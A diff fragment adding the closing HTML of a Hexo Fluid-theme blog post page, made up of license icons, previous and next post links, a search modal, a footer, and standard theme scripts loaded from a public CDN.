+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/26/finally/" title="Finally">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Finally</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/26/lab12/" title="Lab 12">
+                        <span class="hidden-mobile">Lab 12</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>&nbsp;&nbsp;Hexo</span></a> <i class="iconfont icon-notebook"></i> <a href="https://r0otsu.github.io" target="_blank" rel="nofollow noopener"><span>r0otsu</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="umami-site-pv-container" style="display: none">
+        总访问量 
+        <span id="umami-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="umami-site-uv-container" style="display: none">
+        总访客数 
+        <span id="umami-site-uv"></span>
+         人
+      </span>
+    
+    
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/umami-view.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
